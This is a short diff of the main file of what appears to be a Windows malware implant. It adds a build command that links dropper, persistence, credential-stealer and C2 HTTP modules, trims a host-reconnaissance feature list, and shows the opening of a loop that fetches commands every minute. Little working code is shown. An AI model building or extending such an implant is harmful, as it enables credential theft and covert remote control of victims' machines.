@@ -1,9 +1,5 @@
 #include "implant.h"
-
-//Implement Injection
-//Implement Dropper
-//Implement sendtoC2
-
+// x86_64-w64-mingw32-g++ implant.cpp execute/execute.cpp dropper/Dropper.cpp file/file.cpp http/http.cpp persist/persist.cpp situational_awareness/GatherInfo.cpp stealer/aes_gcm.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/stealer.cpp -lshlwapi -lurlmon -lwininet -lwinhttp  -lbcrypt -lcrypt32 -luserenv -static -o implant.exe   
 /*
 Notes: GatherInfo - 
 [Currently has Computer name, username, and privileges]
@@ -12,7 +8,6 @@ Read the environment variables
     ○  MAC, IPs, interface names…etc
 ● Get the windows version
 ● Get the current username and token
-● Get the Computers name
 ● Get the Machine GUID
 ● List files in a directory
 ● Change Directory
@@ -68,7 +63,6 @@ Expected Check in: When should you expect to see the agent again?
 */
 
 
-// x86_64-w64-mingw32-g++ implant.cpp stealer/stealer.cpp stealer/SQLfunctions.cpp stealer/sqlite3.o stealer/aes_gcm.cpp http/http.cpp persist/persist.cpp execute/execute.cpp situational_awareness/GatherInfo.cpp file/file.cpp  -lwinhttp  -lbcrypt -lcrypt32  -static -luserenv -o implant.exe  
 void IWillRunForever(void){
     while(true){
         /* THIS IS GETTING US COMMANDS EVERY MINUTE */
